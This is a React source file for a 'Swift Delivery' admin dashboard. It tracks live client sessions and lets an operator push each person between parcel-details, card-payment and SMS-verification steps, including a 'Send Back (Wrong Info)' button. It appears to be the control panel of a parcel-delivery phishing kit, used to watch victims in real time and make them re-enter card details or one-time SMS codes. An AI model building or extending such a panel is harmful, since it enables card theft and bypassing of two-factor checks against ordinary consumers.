import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { 
  RefreshCw, 
  CreditCard, 
  MessageSquare, 
  Package,
  ArrowLeft,
  Users,
  Clock
} from "lucide-react";
import { toast } from "@/hooks/use-toast";
import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";

interface ClientSession {
  id: string;
  session_code: string;
  client_name: string | null;
  phone_number: string | null;
  current_step: number;
  parcel_tracking: string | null;
  amount: number | null;
  status: string | null;
  created_at: string;
  updated_at: string;
}

const stepNames: Record<number, string> = {
  1: "Parcel Details",
  2: "Payment",
  3: "SMS Verification"
};

const stepColors: Record<number, string> = {
  1: "bg-blue-500",
  2: "bg-yellow-500",
  3: "bg-green-500"
};

const AdminPanel = () => {
  const [sessions, setSessions] = useState<ClientSession[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchSessions = async () => {
    const { data, error } = await supabase
      .from("client_sessions")
      .select("*")
      .eq("status", "active")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("Error fetching sessions:", error);
      toast({
        title: "Error",
        description: "Failed to fetch client sessions",
        variant: "destructive"
      });
    } else {
      setSessions(data || []);
    }
    setLoading(false);
  };

  const updateClientStep = async (sessionId: string, newStep: number, action: string) => {
    const { error } = await supabase
      .from("client_sessions")
      .update({ current_step: newStep })
      .eq("id", sessionId);

    if (error) {
      console.error("Error updating session:", error);
      toast({
        title: "Error",
        description: "Failed to update client step",
        variant: "destructive"
      });
    } else {
      toast({
        title: "Success",
        description: `Client sent back to ${stepNames[newStep]}`,
      });
    }
  };

  useEffect(() => {
    fetchSessions();

    // Subscribe to realtime changes
    const channel = supabase
      .channel("client_sessions_changes")
      .on(
        "postgres_changes",
        {
          event: "*",
          schema: "public",
          table: "client_sessions"
        },
        () => {
          fetchSessions();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const getTimeSince = (dateString: string) => {
    const date = new Date(dateString);
    const now = new Date();
    const diffMs = now.getTime() - date.getTime();
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return "Just now";
    if (diffMins < 60) return `${diffMins}m ago`;
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `${diffHours}h ago`;
    return `${Math.floor(diffHours / 24)}d ago`;
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="bg-secondary text-secondary-foreground py-4 shadow-lg">
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img 
                src={swiftDeliveryLogo} 
                alt="Swift Delivery" 
                className="h-8 object-contain"
              />
              <div>
                <h1 className="text-xl font-semibold">Admin Panel</h1>
                <p className="text-sm text-secondary-foreground/70">Client Control Dashboard</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <div className="flex items-center gap-2 text-sm">
                <Users className="w-4 h-4" />
                <span>{sessions.length} active</span>
              </div>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={fetchSessions}
                className="gap-2"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        {loading ? (
          <div className="flex items-center justify-center py-20">
            <RefreshCw className="w-8 h-8 animate-spin text-muted-foreground" />
          </div>
        ) : sessions.length === 0 ? (
          <Card className="text-center py-20">
            <CardContent>
              <Users className="w-16 h-16 mx-auto text-muted-foreground mb-4" />
              <h2 className="text-xl font-semibold mb-2">No Active Clients</h2>
              <p className="text-muted-foreground">
                When clients start the payment flow, they will appear here.
              </p>
            </CardContent>
          </Card>
        ) : (
          <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
            {sessions.map((session) => (
              <Card key={session.id} className="overflow-hidden">
                <CardHeader className="pb-3">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-lg flex items-center gap-2">
                      <span className="font-mono bg-muted px-2 py-1 rounded text-sm">
                        #{session.session_code}
                      </span>
                    </CardTitle>
                    <Badge className={`${stepColors[session.current_step]} text-white`}>
                      {stepNames[session.current_step]}
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Client Info */}
                  <div className="space-y-2 text-sm">
                    {session.client_name && (
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Name:</span>
                        <span className="font-medium">{session.client_name}</span>
                      </div>
                    )}
                    {session.phone_number && (
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Phone:</span>
                        <span className="font-medium">{session.phone_number}</span>
                      </div>
                    )}
                    {session.parcel_tracking && (
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Tracking:</span>
                        <span className="font-mono text-xs">{session.parcel_tracking}</span>
                      </div>
                    )}
                    {session.amount && (
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Amount:</span>
                        <span className="font-semibold text-primary">£{session.amount.toFixed(2)}</span>
                      </div>
                    )}
                    <div className="flex justify-between items-center pt-2 border-t">
                      <span className="text-muted-foreground flex items-center gap-1">
                        <Clock className="w-3 h-3" /> Updated:
                      </span>
                      <span className="text-xs">{getTimeSince(session.updated_at)}</span>
                    </div>
                  </div>

                  {/* Control Buttons */}
                  <div className="space-y-2 pt-2 border-t">
                    <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
                      Send Client To:
                    </p>
                    <div className="grid grid-cols-3 gap-2">
                      <Button
                        variant={session.current_step === 1 ? "default" : "outline"}
                        size="sm"
                        className="flex-col h-auto py-2 gap-1"
                        onClick={() => updateClientStep(session.id, 1, "parcel")}
                        disabled={session.current_step === 1}
                      >
                        <Package className="w-4 h-4" />
                        <span className="text-xs">Parcel</span>
                      </Button>
                      <Button
                        variant={session.current_step === 2 ? "default" : "outline"}
                        size="sm"
                        className="flex-col h-auto py-2 gap-1"
                        onClick={() => updateClientStep(session.id, 2, "card")}
                        disabled={session.current_step === 2}
                      >
                        <CreditCard className="w-4 h-4" />
                        <span className="text-xs">Card</span>
                      </Button>
                      <Button
                        variant={session.current_step === 3 ? "default" : "outline"}
                        size="sm"
                        className="flex-col h-auto py-2 gap-1"
                        onClick={() => updateClientStep(session.id, 3, "sms")}
                        disabled={session.current_step === 3}
                      >
                        <MessageSquare className="w-4 h-4" />
                        <span className="text-xs">SMS</span>
                      </Button>
                    </div>
                  </div>

                  {/* Quick Actions */}
                  {session.current_step > 1 && (
                    <Button
                      variant="destructive"
                      size="sm"
                      className="w-full gap-2"
                      onClick={() => updateClientStep(session.id, session.current_step - 1, "back")}
                    >
                      <ArrowLeft className="w-4 h-4" />
                      Send Back (Wrong Info)
                    </Button>
                  )}
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </main>
    </div>
  );
};

export default AdminPanel;
